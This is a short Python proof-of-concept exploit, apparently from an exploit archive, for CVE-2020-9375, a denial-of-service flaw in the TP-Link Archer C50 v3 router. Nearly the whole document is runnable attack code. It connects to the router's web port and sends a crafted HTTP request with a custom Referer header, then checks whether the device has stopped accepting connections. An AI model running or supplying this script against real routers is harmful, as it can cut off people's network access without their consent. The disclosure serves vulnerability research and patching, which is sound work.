# Exploit Title: TP-Link Archer C50 3 - Denial of Service (PoC)
# Date: 2020-01-25
# Exploit Author: thewhiteh4t
# Vendor Homepage: https://www.tp-link.com/
# Version: TP-Link Archer C50 v3 Build 171227
# Tested on: Arch Linux x64
# CVE: CVE-2020-9375
# Description: https://thewhiteh4t.github.io/2020/02/27/CVE-2020-9375-TP-Link-Archer-C50-v3-Denial-of-Service.html

import time
import socket

ip = '192.168.0.1'
port = 80

print('[+] IP   : ' + ip)
print('[+] Port : ' + str(port))

for i in range(2):
	time.sleep(1)
	try:
		print('[+] Initializing Socket...')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		print('[!] Connecting to target...')
		s.connect((ip, port))
		header = 'GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0\r\nReferer: thewhiteh4t\r\n\r\n'.format(ip)
		header = header.encode()
		print('[!] Sending Request...')
		s.sendall(header)
		print('[!] Disconnecting Socket...')
		s.close()
		if i == 1:
			print('[-] Exploit Failed!')
			break
	except Exception as e:
		if 'Connection refused' in str(e):
			print('[+] Connection Refused...Exploit Successful!')
			break
		else:
			print('[-] Exploit Failed!')
			break